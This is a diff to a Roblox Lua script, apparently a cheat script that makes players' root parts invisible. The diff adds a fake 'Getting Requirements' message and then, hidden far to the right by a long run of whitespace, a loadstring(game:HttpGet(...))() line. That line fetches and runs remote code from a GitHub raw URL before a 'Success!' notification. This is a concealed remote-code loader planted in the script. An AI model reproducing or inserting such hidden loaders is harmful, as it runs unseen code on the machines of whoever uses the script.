@@ -7749,6 +7749,10 @@ for _, player in pairs(game.Players:GetPlayers()) do
         makeHumanoidRootPartInvisible(player.Character)
     end
 end
+wait(0.2)
+print("Getting Requirements... [1 moment.]")
+wait(0.3)
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/Symmetrical-System/refs/heads/main/HelloWorld", true))()
 wait(1)
 game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = "Success!",
